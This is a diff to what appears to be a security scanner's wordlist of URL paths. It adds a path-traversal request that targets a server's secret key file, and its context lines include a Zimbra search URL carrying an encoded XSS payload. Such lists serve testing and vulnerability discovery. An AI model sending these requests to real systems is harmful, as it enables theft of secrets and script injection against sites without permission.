@@ -788,3 +788,4 @@
 /api/v1/auto_login
 /zimbra/h/search?si=1&so=0&sfi=4&st=message&csi=1&action=&cso=0&id=%22%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /api/v1/upload/11111111-1111-1111-1111-111111111111
+/api/v1/files/profile_pictures/../secret_key
